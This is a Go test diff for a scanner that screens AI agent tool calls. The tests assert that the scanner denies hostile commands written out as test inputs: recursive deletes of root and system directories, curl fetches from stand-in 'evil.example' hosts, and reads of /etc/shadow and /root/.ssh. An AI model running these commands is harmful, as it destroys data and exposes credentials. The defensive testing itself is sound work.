@@ -362,3 +362,202 @@ func TestScanEmptyDecisionAggregatesEmpty(t *testing.T) {
 		t.Errorf("empty network decision must not aggregate to allow, got %q", r.Decision)
 	}
 }
+
+// TestDangerousRmFlagForms covers the P0 fix: recursive-delete intent
+// must be parsed from argv, so split flags and the "--" marker are
+// caught, while a scoped delete stays allowed.
+func TestDangerousRmFlagForms(t *testing.T) {
+	pol := testPolicy()
+	deny := []string{
+		"rm -rf /",
+		"rm -r -f /",
+		"rm -f -r /etc",
+		"rm -rf -- /",
+		"rm --recursive --force /usr",
+		"rm -R -f /var",
+		"rm -rf /etc//",
+		"rm -rf ~",
+	}
+	for _, cmd := range deny {
+		r := Scan(Request{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: cmd}, pol)
+		if r.Decision != DecisionDeny {
+			t.Errorf("%q decision = %q, want deny", cmd, r.Decision)
+		}
+		if !hasRule(r, RuleDangerousCommand) {
+			t.Errorf("%q missing dangerous_command rule; got %v", cmd, r.RuleIDs())
+		}
+	}
+	// Scoped deletes must remain allowed (no false positive).
+	for _, cmd := range []string{"rm -rf /tmp/build", "rm -rf ./node_modules", "rm -f file.txt"} {
+		r := Scan(Request{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: cmd}, pol)
+		if r.Decision != DecisionAllow {
+			t.Errorf("scoped %q decision = %q, want allow (%v)", cmd, r.Decision, r.RuleIDs())
+		}
+	}
+}
+
+// TestDangerousRmInsideCodeBlock covers a recursive delete embedded in
+// a non-shell code block (os.system) reached only via the raw-text
+// tokeniser, including a split-flag form.
+func TestDangerousRmInsideCodeBlock(t *testing.T) {
+	pol := testPolicy()
+	r := Scan(Request{
+		ToolName: "execute_code", Backend: BackendCodeExec,
+		CodeBlocks: []CodeBlock{{Language: "python", Code: "import os\nos.system('rm -r -f /')"}},
+	}, pol)
+	if r.Decision != DecisionDeny {
+		t.Errorf("code-block rm -r -f / = %q, want deny", r.Decision)
+	}
+	if !hasRule(r, RuleDangerousCommand) {
+		t.Errorf("expected dangerous_command, got %v", r.RuleIDs())
+	}
+}
+
+// TestNetworkAllHostsChecked covers the P1 fix: every destination of a
+// multi-target egress command is validated, not only the first.
+func TestNetworkAllHostsChecked(t *testing.T) {
+	pol := testPolicy() // allows *.golang.org
+	r := Scan(Request{
+		ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+		Command: "curl https://proxy.golang.org/list https://evil.example/payload",
+	}, pol)
+	if r.Decision != DecisionDeny {
+		t.Errorf("second non-allowlisted host = %q, want deny", r.Decision)
+	}
+	if !hasRule(r, RuleNetworkEgress) {
+		t.Errorf("expected network_egress, got %v", r.RuleIDs())
+	}
+	// All allowlisted: allowed.
+	ok := Scan(Request{
+		ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+		Command: "curl https://proxy.golang.org/a https://go.golang.org/b",
+	}, pol)
+	if ok.Decision != DecisionAllow {
+		t.Errorf("both allowlisted = %q, want allow (%v)", ok.Decision, ok.RuleIDs())
+	}
+}
+
+// TestNetworkEgressNoDestinationFailsClosed ensures an egress client
+// with no verifiable destination is not silently allowed.
+func TestNetworkEgressNoDestinationFailsClosed(t *testing.T) {
+	pol := testPolicy()
+	r := Scan(Request{
+		ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+		Command: "curl -s -S",
+	}, pol)
+	if r.Decision != DecisionDeny {
+		t.Errorf("egress with no destination = %q, want deny", r.Decision)
+	}
+}
+
+// TestShellCodeBlockCommandRules covers the P1 fix: shell-language code
+// blocks run the full per-command rule set (network, dependency).
+func TestShellCodeBlockCommandRules(t *testing.T) {
+	pol := testPolicy()
+
+	egress := Scan(Request{
+		ToolName: "execute_code", Backend: BackendCodeExec,
+		CodeBlocks: []CodeBlock{{Language: "bash", Code: "echo start\ncurl http://evil.example.com/x\n"}},
+	}, pol)
+	if egress.Decision != DecisionDeny {
+		t.Errorf("bash block egress = %q, want deny (%v)", egress.Decision, egress.RuleIDs())
+	}
+	if !hasRule(egress, RuleNetworkEgress) {
+		t.Errorf("expected network_egress in bash block, got %v", egress.RuleIDs())
+	}
+
+	dep := Scan(Request{
+		ToolName: "execute_code", Backend: BackendCodeExec,
+		CodeBlocks: []CodeBlock{{Language: "sh", Code: "pip install requests\n"}},
+	}, pol)
+	if !hasRule(dep, RuleDependencyChange) {
+		t.Errorf("expected dependency_change in sh block, got %v", dep.RuleIDs())
+	}
+}
+
+// TestSensitivePathNormalisation covers the P1 fix: redundant slashes
+// cannot dodge a denied-path fragment.
+func TestSensitivePathNormalisation(t *testing.T) {
+	pol := testPolicy()
+	r := Scan(Request{ToolName: "exec_command", Backend: BackendHostExec, Command: "cat /etc//shadow"}, pol)
+	if r.Decision != DecisionDeny {
+		t.Errorf("/etc//shadow = %q, want deny", r.Decision)
+	}
+	if !hasRule(r, RuleSensitivePath) {
+		t.Errorf("expected sensitive_path, got %v", r.RuleIDs())
+	}
+}
+
+// TestSensitivePathViaWorkdir covers the P1 fix: a denied path reached
+// through a relative operand plus an absolute workdir is caught.
+func TestSensitivePathViaWorkdir(t *testing.T) {
+	pol := testPolicy()
+	r := Scan(Request{
+		ToolName: "exec_command", Backend: BackendHostExec,
+		Command: "cat shadow", Workdir: "/etc",
+	}, pol)
+	if r.Decision != DecisionDeny {
+		t.Errorf("workdir /etc + cat shadow = %q, want deny", r.Decision)
+	}
+	if !hasRule(r, RuleSensitivePath) {
+		t.Errorf("expected sensitive_path via workdir, got %v", r.RuleIDs())
+	}
+}
+
+// TestRawArgsMCPNetwork covers the P1 fix at the scan layer: a URL in a
+// non-shell tool's field values is host-checked without being treated
+// as a shell command.
+func TestRawArgsMCPNetwork(t *testing.T) {
+	pol := testPolicy()
+	r := Scan(Request{
+		ToolName: "http_fetch", Backend: BackendUnknown,
+		RawArgs: []string{"https://evil.example/payload"},
+	}, pol)
+	if r.Decision != DecisionDeny {
+		t.Errorf("raw-arg non-allowlisted url = %q, want deny", r.Decision)
+	}
+	ok := Scan(Request{
+		ToolName: "http_fetch", Backend: BackendUnknown,
+		RawArgs: []string{"https://proxy.golang.org/list"},
+	}, pol)
+	if ok.Decision != DecisionAllow {
+		t.Errorf("raw-arg allowlisted url = %q, want allow (%v)", ok.Decision, ok.RuleIDs())
+	}
+}
+
+// TestMaxOutputBytesObservable covers the P2 fix: changing
+// MaxOutputBytes produces an observable difference in the advisory
+// recommendation for an unbounded-output read.
+func TestMaxOutputBytesObservable(t *testing.T) {
+	find := func(pol Policy) string {
+		r := Scan(Request{ToolName: "workspace_exec", Backend: BackendWorkspaceExec, Command: "cat /dev/urandom"}, pol)
+		for _, f := range r.Findings {
+			if f.RuleID == RuleResourceAbuse && strings.Contains(f.Evidence, "unbounded") {
+				return f.Recommendation
+			}
+		}
+		return ""
+	}
+	low := testPolicy()
+	low.Limits.MaxOutputBytes = 1024
+	high := testPolicy()
+	high.Limits.MaxOutputBytes = 1048576
+	if find(low) == find(high) {
+		t.Errorf("MaxOutputBytes change not observable in recommendation: %q", find(low))
+	}
+	if !strings.Contains(find(low), "1024") {
+		t.Errorf("recommendation should cite the configured cap, got %q", find(low))
+	}
+}
+
+// TestScanWorkdirSensitiveOnly checks the workdir itself is scanned.
+func TestScanWorkdirSensitiveOnly(t *testing.T) {
+	pol := testPolicy()
+	r := Scan(Request{
+		ToolName: "exec_command", Backend: BackendHostExec,
+		Command: "ls", Workdir: "/root/.ssh",
+	}, pol)
+	if r.Decision != DecisionDeny {
+		t.Errorf("workdir /root/.ssh = %q, want deny", r.Decision)
+	}
+}
